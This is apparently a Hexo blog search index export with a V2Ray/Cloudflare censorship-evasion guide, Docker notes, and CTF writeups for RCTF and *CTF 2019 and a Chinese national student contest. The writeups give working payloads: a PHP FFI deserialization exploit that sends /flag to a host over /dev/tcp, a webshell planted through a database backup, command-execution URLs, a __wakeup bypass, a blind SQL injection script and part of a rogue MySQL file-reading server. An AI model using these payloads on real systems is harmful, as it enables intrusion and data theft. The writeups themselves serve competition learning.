<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Escaping]]></title>
    <url>%2Fblog%2Fpubli%2F2019%2F06%2F25%2FEscaping</url>
    <content type="text"><![CDATA[Recently, massive of VPS servers on *** have been banned by ***, so here is my experience (only a few steps) saving my banned servers back with Cloudflare. Banned ServerOS of my server is CentOS 7, and I’m using nginx web server on it, and I also want my server to support PHP. Install nginx. 1234567891011# vi /etc/yum.repos.d/nginx.repo# cat /etc/yum.repos.d/nginx.repo[nginx]name=nginx repobaseurl=http://nginx.org/packages/mainline/centos/7/$basearch/gpgcheck=0enabled=1# yum update# yum install -y nginx Configure nginx to support PHP. (I already have PHP installed). 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# yum install php-fpm# service php-fpm start# systemctl enable php-fpm# cp /etc/nginx/conf.d/default.conf /etc/nginx/conf.d/default.conf.bak# vi /etc/nginx/conf.d/default.conf# cat /etc/nginx/conf.d/default.conserver &#123; listen 80; server_name localhost; charset utf-8; #access_log /var/log/nginx/host.access.log main; location / &#123; root /usr/share/nginx/html; index index.html index.htm index.php; &#125; #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root /usr/share/nginx/html; &#125; # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \.php$ &#123; # proxy_pass http://127.0.0.1; #&#125; # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # location ~ \.php$ &#123; root /usr/share/nginx/html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125; # deny access to .htaccess files, if Apache&apos;s document root # concurs with nginx&apos;s one # #location ~ /\.ht &#123; # deny all; #&#125;&#125; generate certificate 123456# yum install -y nc# yum install -y socat# curl https://get.acme.sh | sh# service nginx stop# ~/.acme.sh/acme.sh --issue -d domain --standalone -k ec-256# ~/.acme.sh/acme.sh --installcert -d domain --fullchainpath /path/path/cert.crt --keypath /path/path/key --ecc install v2ray &amp; configure it 1bash &lt;(curl -L -s https://install.direct/go.sh) Configuration is as follows: 1234567891011121314151617181920212223242526272829303132333435363738&#123;&quot;inbounds&quot;: [&#123; &quot;port&quot;: 11111, &quot;listen&quot;: &quot;127.0.0.1&quot;, &quot;protocol&quot;: &quot;vmess&quot;, &quot;settings&quot;: &#123; &quot;clients&quot;: [ &#123; &quot;id&quot;: &quot;******-****-****-****-***********&quot;, &quot;level&quot;: 1, &quot;alterId&quot;: 64 &#125; ] &#125;, &quot;streamSettings&quot;: &#123; &quot;network&quot;: &quot;ws&quot;, &quot;wsSettings&quot;: &#123; &quot;path&quot;: &quot;/ws&quot; &#125; &#125;&#125;],&quot;outbounds&quot;: [&#123; &quot;protocol&quot;: &quot;freedom&quot;, &quot;settings&quot;: &#123;&#125;&#125;,&#123; &quot;protocol&quot;: &quot;blackhole&quot;, &quot;settings&quot;: &#123;&#125;, &quot;tag&quot;: &quot;blocked&quot;&#125;],&quot;routing&quot;: &#123; &quot;rules&quot;: [ &#123; &quot;type&quot;: &quot;field&quot;, &quot;ip&quot;: [&quot;geoip:private&quot;], &quot;outboundTag&quot;: &quot;blocked&quot; &#125; ]&#125; configure ssl for nginx 1234567891011121314151617server &#123;listen 443 ssl;ssl on;ssl_certificate /etc/v2ray/v2ray.crt;ssl_certificate_key /etc/v2ray/v2ray.key; //这俩证书路径改成你的ssl_protocols TLSv1 TLSv1.1 TLSv1.2;ssl_ciphers HIGH:!aNULL:!MD5;server_name mydomain.me; //域名改成你的 location /ws &#123; # 与 V2Ray 配置中的 path 保持一致 proxy_redirect off; proxy_pass http://127.0.0.1:12345;#假设WebSocket监听在环回地址的12345端口上 proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;upgrade&quot;; proxy_set_header Host $http_host; &#125;&#125; CloudflareCloudflare supports a series of functions to maintain a site. We need it to provide CDN service for our banned servers. With CDN deployed, when visiting domain name of our banned servers, the visitor will first get the IP address of the CDN server, and CDN server do the rest stuffs to communicate with our banned servers, which guarantees that a certain Firewall will never know what site you are visiting. Here are a fill steps set up your Cloudflare: Sign up and sign in Cloudflare. Add your site. (Here you have to register a domain name for your server.) Substitue DNS server of your domain name with DNS Server of Cloudflare. Resolve a domain name to your server. For example, if you want to visit IP 11.11.11.11 when you tpye domain name test.example.com in your browser, you should set a record of type A which contains key test and IP 11.11.11.11 both in cloudflare and your domain name service provider.]]></content>
      <tags>
        <tag>None</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker notes]]></title>
    <url>%2Fblog%2Fpubli%2F2019%2F05%2F22%2Fdocker-notes</url>
    <content type="text"><![CDATA[这里记录自己Docker上用过的一些知识。 主要参考：https://docs.docker.com/ 0x00 关于Docker概念：容器、镜像 A container is launched by running an image. An image is an executable package that includes everything needed to run an application–the code, a runtime, libraries, environment variables, and configuration files. A container is a runtime instance of an image–what the image becomes in memory when executed (that is, an image with state, or a user process). You can see a list of your running containers with the command, docker ps, just as you would in Linux. 镜像是包含运行一个应用所有需要的东西（如代码、运行时、库、环境变量以及配置文件）的包。而容器是通过运行一个镜像而创建的，相当于一个镜像的运行时实例（即镜像在内存里的运行时状态或者用户进程）。 容器和虚拟机： A container runs natively on Linux and shares the kernel of the host machine with other containers. It runs a discrete process, taking no more memory than any other executable, making it lightweight. By contrast, a virtual machine (VM) runs a full-blown “guest” operating system with virtual access to host resources through a hypervisor. In general, VMs provide an environment with more resources than most applications need. 容器运行在宿主机上，并且容器之间共享宿主机内核。容器更加轻量，它运行一个单独的进程，除了自己的应用之外不会因为其他可执行程序而占用多余内存。相比之下，虚拟机运行一个完整的客户操作系统，并且在虚拟机监视器的管理下以虚拟的方式获取宿主机资源。大体上说，在虚拟机上运行应用会要求许多本应用不需要的资源。 0x01 从dockerfile创建镜像最近需要从一个dockerfile部署一个题目环境，这里参考Get Started, Part 2: Containers，使用命令如下： docker build --tag=tagname . 会利用当前目录下的dockerfile创建docker image。 0x02 用过的一些命令 docker info: 查看docker信息。 docker image ls: 列举本地安装的docker镜像。 docker container ls –all: 列举所有容器。 docker run image-tag: 运行一个镜像。 docker run -p localport:containerport image-tag: 运行容器，并映射端口。 docker run -p localport:containerport image-tag: detach模式运行，即后台运行。]]></content>
      <categories>
        <category>笔记</category>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rctf 2019 writeup]]></title>
    <url>%2Fblog%2Fpubli%2F2019%2F05%2F22%2Frctf-2019-writeup</url>
    <content type="text"><![CDATA[RCTF 2019 - Writeup0x00 Web - nextphp通过题目给出代码可以获取phpinfo。disable_functions中禁用函数很全:(，没有imagick组件:(，open_basedir限制为web目录。经过反复查看发现了opcache配置中有opcache.preload = /var/www/html/preload.php。另外，通过glob可以列举目录（可以绕过open_basedir限制，参考博客），得到服务器根目录存在文件flag，web目录下很干净，只有index.php和preload.php两个文件。题目突破口很大可能性存在于preload.php了。通过主页的eval可以读取preload.php的内容如下： &lt;?php final class A implements Serializable { protected $data = [ 'ret' =&gt; null, 'func' =&gt; 'print_r', 'arg' =&gt; '1' ]; private function run () { $this-&gt;data['ret'] = $this-&gt;data['func']($this-&gt;data['arg']); } public function __serialize(): array { return $this-&gt;data; } public function __unserialize(array $data) { array_merge($this-&gt;data, $data); $this-&gt;run(); } public function serialize (): string { return serialize($this-&gt;data); } public function unserialize($payload) { $this-&gt;data = unserialize($payload); $this-&gt;run(); } public function __get ($key) { return $this-&gt;data[$key]; } public function __set ($key, $value) { throw new \Exception('No implemented'); } public function __construct () { throw new \Exception('No implemented'); } } 很像是一个反序列化的入口，可以通过run函数和参数执行命令，但是相关的os调用命令都已经被封死。又注意到php版本为PHP 7.4 - dev，总觉得新版本+dev标志会有些猫腻在。关于preload可以参考以下RFC文档： PHP RFC: Preloading PHP RFC: FFI - Foreign function Interface PHP RFC: New custom object serialization mechanism 文档一表示可以通过php.ini中的opcache.preload来指定一个文件进行预加载（preload），被预加载的文件会被整个执行或者加载其他的文件。也就是说我们可以通过preload.php执行命令，而通过serialize函数我们可以触发其执行。但是相关的系统调用都已经被封死了，这时候需要借用文档二中的FFI。通过FFI，人们可以方便的调用C函数或者处理C结构，相关例子可以再RFC文档中查看。文档三中定义了一种新的序列化机制。 根据以上文档构造payload如下： &lt;?php $a = new A(); $ss = serialize($a); #$ss = 'C:1:"A":61:{a:3:{s:3:"ret";N;s:4:"func";s:7:"print_r";s:3:"arg";s:1:"1";}}'; echo $ss; ?&gt; ?a=$emm=unserialize(%27C:1:"A":95:{a:3:{s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:32:"int%20system(const%20char%20*command);";}}%27);$emm-&gt;ret-&gt;system(%27bash%20-c%20"cat%20/flag%20&gt;%20/dev/tcp/host/port"%27); 0x01 Web - jail0x02 Web - password0x03 Web - calcalcalc0x04 Web - rBlog0x05 Web - ez4cr]]></content>
      <categories>
        <category>CTF</category>
        <category>赛后总结</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>赛后总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[starctf 2019 writeup]]></title>
    <url>%2Fblog%2Fpubli%2F2019%2F04%2F29%2Fstarctf%202019%20writeup%20Zer0-D4y</url>
    <content type="text"><![CDATA[*CTF 2019 - Writeupauthor: Ainassineteam: Zer0-D4yofficial source code: https://github.com/sixstars/starctf2019 0x00 Web - mywebsql点开题目url，是一个mywebsql的管理登录界面，条件反射测试用户名密码admin:admin，登录成功。登录后是一个数据库管理界面。可以进行建表操作。关键是有数据库备份功能。通过github可以得到mywebsql的目录结构，经过验证，其中的backups目录我们确实可以访问，测试备份数据库表，可以指定备份文件名称，在backups目录下可以访问到。step 1构造数据表内容并通过备份生成一句话木马。数据表内容*/&lt;?php eval($_GET[cmd]);?&gt;/*，备份文件名设置为test.php。备份之后访问http://targeturl/backups/test.php?cmd=echo phpinfo();看到phpinfo()打印信息后确认第一步完成。step 2寻找flag位置。通过?cmd=echo system(&#39;ls ..&#39;);层级查看每个目录的内容，最终确定在系统根目录下存在文件flag和readflag。其中flag我们没有读权限，而我们对readflag有执行权限，尝试执行readflag得到输出，其中给出了一个算式，要求我们给出这个算式的结果才能读取flag。step 3读取flag。这里要求我们通过php与服务器上的可执行文件进行读、写的互动操作，通过查询，决定使用php的proc_open()函数。最终构造payload如下：1http://targeturl/backups/123456.php?cmd=$d=array(0=%3Earray(%22pipe%22,%22r%22),1=%3Earray(%22pipe%22,%22w%22));$fp=proc_open(%22../../../../readflag%22,$d,$pipes);$a=fgets($pipes[1]);$x=fgets($pipes[1]);$ret=eval(%22return%20$x;%22);echo%20$ret.%22%3CBR%3E%22;$emm=fwrite($pipes[0],strval($ret));echo%20$emm.%22%3CBR%3E%22;fclose($pipes[0]);$c=fgets($pipes[1]);$e=fgets($pipes[1]);echo%20$c.%20$e.%22%3CBR%3E%22;fclose($pipes[1]);proc_close($fp); 成功getflag。 0x01 Misc - CheckinFreenode 输入频道号 #*ctf2019，在频道顶部就是flag。 0x02 Misc - She下载下来是个游戏，可以利用rpg maker xp直接进行编辑。在游戏左下房子我们需要打败一只“野鸡？”进入到后面的关卡，这里比较麻烦，我们修改进入左下房子的事件，可以直接进入一个地牢一样的地方，地牢总共有三个房间，每个房间有三个隔间关着三只箱子。打开隔间的门需要遵从一定的顺序，经过分析，打开的顺序（按照里面箱子的号码排序）为3-&gt;7-&gt;1-&gt;2-&gt;6-&gt;9，打开之后可以进入最后的房间。在最后的房间，镜子会告诉你把前面看到的箱子里的数字md5编码之后就是flag。但是之前的序列编码得到的flag不正确。需要按照房间的顺序重新排序。最终数字序列似乎为312679（记不清了），MD5编码后放到*CTF{}里面提交即可。 0x03 Misc - babyflash下载之后得到一个swf文件，解压获得里面的图片和音频。对于图片按照图片顺序，黑为0白为1，拼凑出0-1序列如下(脚本找不到了)：1000000011001110000000011111011000110111110010001010100110100010010001011011010100010010001011010010100010011111011001110111110000000010101010000000111111110101011111111000100000100000111011001001100100010000100010010000110010000100101101110011111111100000101011111011100111111111110100011001100000000010100011001010011111010010111011101010001010100100111110010001011010010001111010001010010001001110011111010100011101101000000010010011110100 利用脚本将其拼成二维码，扫出一半flag为*ctf{half_flag_&amp;，脚本如下：123456789101112131415161718192021# coding=utf-8from PIL import Imageimport mathlength = int(math.sqrt(441))im = Image.new(&apos;RGB&apos;, (length * 5, length * 5))data = &quot;000000011001110000000011111011000110111110010001010100110100010010001011011010100010010001011010010100010011111011001110111110000000010101010000000111111110101011111111000100000100000111011001001100100010000100010010000110010000100101101110011111111100000101011111011100111111111110100011001100000000010100011001010011111010010111011101010001010100100111110010001011010010001111010001010010001001110011111010100011101101000000010010011110100&quot;for x in range(length): for y in range(length): if data[x * length + y] == &apos;0&apos;: for ii in range(x * 5, x * 5 + 5): for jj in range(y * 5, y * 5 + 5): im.putpixel([ii, jj], (0,0,0)) else: for ii in range(x * 5, x * 5 + 5): for jj in range(y * 5, y * 5 + 5): im.putpixel([ii, jj], (255,255,255))im.save(&apos;out.png&apos;) 对于音频使用audacity转为频谱模式，可以看到&amp;_the_rest}字样。最终 flag: *ctf{halfflag&amp;&amp;_the_rest} 0x04 Misc - otaku拿到文件，是一个word和一个压缩包，尝试解压显示里面有一个flag.png和一个last words.txt，其中last words.txt显示为423字节（好像是这么长）。打开word文件，通过格式刷，发现了隐藏文字，其长度也是423字节，故联想到已知明文攻击。破解得到密码为My_waifu。拿到图片后使用stageSolve，在Extract data工具中设置R=0,G=0,B=0，选择Extract By Row和LSB First，在提取信息的顶部可以看到flag。 0x05 Crypto - babyprng &amp; babyprng2第一题解题脚本：12345678910111213141516171819202122232425262728293031323334353637383940414243import randomimport stringimport pwnfrom hashlib import sha256def brust_sha(known_part, known_whole_sha): for w in string.ascii_letters+string.digits: for x in string.ascii_letters+string.digits: for y in string.ascii_letters+string.digits: for z in string.ascii_letters+string.digits: proof = w+x+y+z+known_part digest = sha256(proof).hexdigest() if digest == known_whole_sha: return w+x+y+zr = pwn.remote("34.92.185.118", 10002)sha_code = r.recvuntil("Give me XXXX:")# print sha_codeknown = sha_code[sha_code.find("XXXX+")+5: sha_code.find(")")]known_sha = sha_code.split('\n')[0].split()[-1]# print known, known_shaXXXX = brust_sha(known, known_sha)r.sendline(XXXX)r.recvuntil("opcode(hex): ")r.sendline("0404000235")get_flag = r.recvline()print get_flag 第二题解题脚本：12345678910111213141516171819202122get_flag = "&gt;.&lt;"while get_flag == "&gt;.&lt;": r = pwn.remote("34.92.185.118", 10003) sha_code = r.recvuntil("Give me XXXX:") print sha_code known = sha_code[sha_code.find("XXXX+")+5:sha_code.find(")")] known_sha = sha_code.split('\n')[0].split()[-1] XXXX = brust_sha(known, known_sha) print XXXX r.sendline(XXXX) print r.recvuntil("opcode(hex): ") r.sendline("0004010535") get_flag = r.recvline(keepends = False) print get_flag 0x05 Crypto - notcurves解题脚本：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104#coding=utf8from pwn import *import hashlibimport randomimport mathimport jsonimport timefrom gmpy2 import *from hashlib import sha256'''nc 34.85.45.159 20005'''primeList = []primeDict = &#123;&#125;for i in range(2**14,2**15): if is_prime(i): if i == 20563 or i == 20707: print "BOM" primeList.append(i)for i in range(len(primeList)): for j in range(len(primeList)): primeDict[primeList[i]*primeList[j]] = (primeList[i],primeList[j])def brust_sha(known_part, known_whole_sha): for w in string.ascii_letters+string.digits: for x in string.ascii_letters+string.digits: for y in string.ascii_letters+string.digits: for z in string.ascii_letters+string.digits: proof = w+x+y+z+known_part digest = sha256(proof).hexdigest() if digest == known_whole_sha: return w+x+y+z if __name__ == "__main__":# conn = remote("0.0.0.0",20005) conn = remote("34.85.45.159",20005) sha_code = conn.recvuntil("Give me XXXX:") # print sha_code known = sha_code[sha_code.find("XXXX+")+5: sha_code.find(")")] known_sha = sha_code.split('\n')[0].split()[-1] # print known, known_sha XXXX = brust_sha(known, known_sha) print XXXX conn.sendline(XXXX) s = conn.recvuntil('\n') print s #time.sleep(3) tmpt = 300000000 bit_label = 8 lastNum = "" while bit_label &gt;= 0: s = conn.recvuntil('\n')# print s s = conn.recvuntil('\n')# print s s = conn.recvuntil('\n')# print s s = conn.recvuntil('\n')# print s s = conn.recvuntil('\n')# print s s = conn.recvuntil('&gt;&gt;')# print s conn.sendline("4\n") s = conn.recvuntil('input point A: \n')# print s conn.sendline("(1,3)\n") s = conn.recvuntil('input number t: \n')# print s conn.sendline("%d\n"%tmpt) s = conn.recvuntil('\n')# print "#",s# print s.split(':')[-1] if lastNum == "": lastNum = s.split(':')[-1] print lastNum time.sleep(3) if int(s.split(':')[-1]) &lt;= int(lastNum) and int(s.split(':')[-1]) != 0: if int(s.split(':')[-1]) &lt; int(lastNum): lastNum = s.split(':')[-1] tmpt += 10**bit_label else: if int(s.split(':')[-1]) != 0: lastNum = s.split(':')[-1] tmpt -= 10**bit_label bit_label -= 1 if bit_label &lt; 0: tmpt += 1 else: tmpt += 10**bit_label print tmpt print tmpt print primeDict[tmpt] conn.interactive()]]></content>
      <categories>
        <category>CTF</category>
        <category>赛后总结</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>赛后总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第十二届全国大学生信息安全竞赛回顾]]></title>
    <url>%2Fblog%2Fpubli%2F2019%2F04%2F22%2F%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%9B%9E%E9%A1%BE</url>
    <content type="text"><![CDATA[0x00 Web - Justsoso题目主要涉及index.php和hint.php两个PHP文件：index.php1234567891011121314151617181920212223242526272829&lt;html&gt;&lt;?phperror_reporting(0); $file = $_GET["file"]; $payload = $_GET["payload"];if(!isset($file))&#123; echo 'Missing parameter'.'&lt;br&gt;';&#125;if(preg_match("/flag/",$file))&#123; die('hack attacked!!!');&#125;@include($file);if(isset($payload))&#123; $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); foreach($query as $value)&#123; if (preg_match("/flag/",$value)) &#123; die('stop hacking!'); exit(); &#125; &#125; $payload = unserialize($payload);&#125;else&#123; echo "Missing parameters"; &#125; ?&gt;&lt;!--Please test index.php?file=xxx.php --&gt;&lt;!--Please get the source of hint.php--&gt;&lt;/html&gt; index.php接收GET类型参数file和payload，并将参数值分别存入变量$file和$payload中。$file后来被用作文件包含include的参数。$payload则被用作反序列化unserialize()的参数。两个变量都需要通过正则式/flag/的过滤。具体反序列化产生的对象需要查看hint.php。hint.php1234567891011121314151617181920212223242526272829303132333435363738&lt;?php class Handle&#123; private $handle; public function __wakeup()&#123; foreach(get_object_vars($this) as $k =&gt; $v) &#123; $this-&gt;$k = null; &#125; echo "Waking up\n"; &#125; public function __construct($handle) &#123; $this-&gt;handle = $handle; &#125; public function __destruct()&#123; $this-&gt;handle-&gt;getFlag(); &#125;&#125;class Flag&#123; public $file; public $token; public $token_flag; function __construct($file)&#123; $this-&gt;file = $file; $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000)); &#125; public function getFlag()&#123; $this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag) &#123; if(isset($this-&gt;file))&#123; echo @highlight_file($this-&gt;file,true); &#125; &#125; &#125;&#125;?&gt; hint.php中主要定义了Handle和Flag两个类。Handle类中定义了__wakeup()、__construct($handle)、__destruct()三个魔术函数。分别在反序列化完成时、对象构造时、对象析构时得到调用。观察到析构函数中会调用$this-&gt;handle-&gt;getFlag()，对应了下面Flag类中的getFlag()函数，推断Flag类中私有变量$handle实为Flag对象。Flag类内含$file、$token、$token_flag三个变量。其构造函数在接受$file变量的同时产生一个随机MD5值，并将该MD5赋给两个token。在getFlag()函数中，会为token_flag重新生成一个MD5值，在token_flag和token两者相同的情况下通过highlight_file()函数高亮显示$file变量指定的文件。这里我们需要显示的是flag.php文件的内容。现在我们需要构造一个序列化字符串作为$payload的值，成功避过正则式/flag/的匹配，成功触发Handle类的析构函数，并在Flag类两个token相等的情况下读取flag.php的内容。Step 1 构造序列化字符串根据上面的逻辑，可以由以下PHP代码生成序列化字符串。1234567$file = 'flag.php';$flag = new Flag($file);$flag-&gt;token = &amp;$token_flag; // 通过&amp;符取地址，使得$token中保存$token_flag的引用，从而保证两者一致。$handle = new Handle($flag);$serialized_str = serialize($handle);echo var_dump($serialized_str); 最后得到序列化字符串：1O:6:&quot;Handle&quot;:1:&#123;s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;token_flag&quot;;s:6:&quot;asdfdf&quot;;s:5:&quot;token&quot;;R:4;&#125;&#125; 其中因为$handle为私有变量，所以序列化字符串的Handle和handle前面需要有空字节，为了绕过__wakeup()函数，需要将&quot;Handle&quot;:后面的数字1改为2(CVE-2016-7124，影响PHP5 &lt; 5.6.25，PHP7 &lt; 7.0.10)。所以最终的$payload值为：1O:6:&quot;Handle&quot;:2:&#123;s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;token_flag&quot;;s:6:&quot;asdfdf&quot;;s:5:&quot;token&quot;;R:4;&#125;&#125; Step 2 规避正则式匹配至此我们的请求payload应该为：1index.php?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:&#123;s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;token_flag&quot;;s:6:&quot;asdfdf&quot;;s:5:&quot;token&quot;;R:4;&#125;&#125; 在经过index.php的parse_url()和parse_str()后，请求中的每个参数值都会经过正则式\flag\的匹配，因为我们要读取flag.php文件，且请求中有token_flag字符串，所以需要绕过正则匹配。这里利用的是parse_url()的缺陷（参考这里），所以构造请求如下，可以使parse_url()返回False从而避开正则匹配。1http://target_url///index.php?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:&#123;s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;token_flag&quot;;s:6:&quot;asdfdf&quot;;s:5:&quot;token&quot;;R:4;&#125;&#125; 关于parse_url()，可以参照http://pupiles.com/谈谈parse_url.html 0x01 Web - love_math 参考：https://www.seanzhang.top/2019/04/21/12th_web_writeup.html 访问题目页面，有一个输入框接收用户输入，提交请求后返回eval()执行用户输入的结果。题目应该会把eval()执行函数限制在数学计算函数中。页面含有脚本：1234567891011121314151617&lt;script&gt; $(&apos;#calc&apos;).submit(function()&#123; $.ajax(&#123; url:&quot;calc.php?c=&quot;+encodeURIComponent($(&quot;#content&quot;).val()), type:&apos;GET&apos;, success:function(data)&#123; $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt; &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125; &lt;/div&gt;`); &#125;, error:function()&#123; alert(&quot;连接失败!&quot;); &#125; &#125;) return false; &#125;)&lt;/script&gt; 得知存在calc.php文件接收参数c进行相关数学计算。获取其源码：12345678910111213141516171819202122232425262728&lt;?php error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET[&apos;c&apos;]))&#123; show_source(__FILE__); &#125;else&#123; //例子 c=20-1 $content = $_GET[&apos;c&apos;]; if (strlen($content) &gt;= 80) &#123; die(&quot;太长了不会算&quot;); &#125; $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $content)) &#123; die(&quot;请不要输入奇奇怪怪的字符&quot;); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&apos;abs&apos;, &apos;acos&apos;, &apos;acosh&apos;, &apos;asin&apos;, &apos;asinh&apos;, &apos;atan2&apos;, &apos;atan&apos;, &apos;atanh&apos;, &apos;base_convert&apos;, &apos;bindec&apos;, &apos;ceil&apos;, &apos;cos&apos;, &apos;cosh&apos;, &apos;decbin&apos;, &apos;dechex&apos;, &apos;decoct&apos;, &apos;deg2rad&apos;, &apos;exp&apos;, &apos;expm1&apos;, &apos;floor&apos;, &apos;fmod&apos;, &apos;getrandmax&apos;, &apos;hexdec&apos;, &apos;hypot&apos;, &apos;is_finite&apos;, &apos;is_infinite&apos;, &apos;is_nan&apos;, &apos;lcg_value&apos;, &apos;log10&apos;, &apos;log1p&apos;, &apos;log&apos;, &apos;max&apos;, &apos;min&apos;, &apos;mt_getrandmax&apos;, &apos;mt_rand&apos;, &apos;mt_srand&apos;, &apos;octdec&apos;, &apos;pi&apos;, &apos;pow&apos;, &apos;rad2deg&apos;, &apos;rand&apos;, &apos;round&apos;, &apos;sin&apos;, &apos;sinh&apos;, &apos;sqrt&apos;, &apos;srand&apos;, &apos;tan&apos;, &apos;tanh&apos;]; preg_match_all(&apos;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&apos;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;请不要输入奇奇怪怪的函数&quot;); &#125; &#125; //帮你算出答案 eval(&apos;echo &apos;.$content.&apos;;&apos;); &#125; 其中对输入长度和特殊字符进行了过滤，并以白名单的方式限制eval()执行的函数为列表中的数学函数。其中有一个函数为base_convert()能够实现不同进制的转换，我们设想可以通过他来实现从字符串到数字的转换（字符串组成基本上是英文字母，而26个英文字母加上10个数字可以认为是36进制）。1234base_convert("ls",36,10);// 784，即36进制的"ls"转化为10进制为数字784base_convert(784,10,36);// 通过这种方式还原"ls" 通过上述方法执行ls命令后得知目录下存在flag.php文件，我们的任务也就是读取其中的内容了。但是原本的base_convert()方法无法逾越字数限制，于是考虑构造$_GET()函数，从而引入另一个参数，绕过长度限制。那么如何构造_呢？通过查ASCII表，_的十六进制为5f，那么hex2bin(“5f”)就代表二进制字符串_，然后用base_convert(37907361743,10,36)构造hex2bin()函数。通过变量替换：12$pi=base_convert(37907361743,10,36)(dechex(1598506324)); // 即：$pi = _GET; 构造请求，增加接收参数：12($$pi)&#123;1&#125;(($$pi)&#123;2&#125;) // 即：($_GET)&#123;1&#125;(($_GET))&#123;2&#125;; 发送参数，查看flag：1&amp;1=system&amp;2=cat%20flag.php 最终payload:1http://target_url/calc.php?c=$pi%3Dbase_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;0&#125;(($$pi)&#123;1&#125;)&amp;0=system&amp;1=cat%20flag.php 0x02 Web - 全宇宙最简单的SQL 参考https://www.zhaoj.in/read-5417.html 页面主要接收username和password两个输入，经过测试，可以确认以下几点： username存在注入点。 or被替换为QwQ. 拼接语句执行无误时无论如何均返回“登录失败”。 当拼接语句执行失败时返回“数据库操作失败”。 故推断题目为布尔型盲注。经过测试，payload如下：1username = admin&apos; union select cot(1 and left(database(),1)&gt;&apos;a&apos;);# 即当`left(database(),1)&gt;’a’为真时，整个表达式大于0，没有错误产生；当条件为假时，表达式等于0，产生错误。利用脚本Fuzz：123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/usr/bin/env python3# -*- coding: utf-8 -*-import requestsdef main(): get_all_databases("http://39.97.167.120:52105/")def http_get(url, payload): result = requests.post(url, data=&#123;'username': 'admin' + payload, 'password': '123456'&#125;) result.encoding = 'utf-8' if result.text.find('数据库操作失败') == -1: return True else: return False# 获取数据库def get_all_databases(url): db_nums_payload = "select count(*) from users" db_numbers = half(url, db_nums_payload) print("长度为：%d" % db_numbers)# 二分法函数def half(url, payload): low = 0 high = 126 # print(standard_html) while low &lt;= high: mid = (low + high) / 2 mid_num_payload = "' union select cot(1 and (%s) &gt; %d);#" % (payload, mid) # print(mid_num_payload) # print(mid_html) if http_get(url, mid_num_payload): low = mid + 1 else: high = mid - 1 mid_num = int((low + high + 1) / 2) return mid_numif __name__ == '__main__': main() 后面类比，读取user表内容，测出username=admin，password=F1AG@1s-at_/fll1llag_h3r3，似乎提示flag的位置。用上述用户名密码可以正常登录。进入了一个可以执行sql的页面。运行恶意mysql服务器：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252#!/usr/bin/env python#coding: utf8import socketimport asyncoreimport asynchatimport structimport randomimport loggingimport logging.handlersPORT = 3306log = logging.getLogger(__name__)log.setLevel(logging.DEBUG)# tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')tmp_format = logging.StreamHandler()tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))log.addHandler( tmp_format)filelist = (# r'c:\boot.ini',# r'c:\windows\win.ini',# r'c:\windows\system32\drivers\etc\hosts', '/fll1llag_h3r3',# 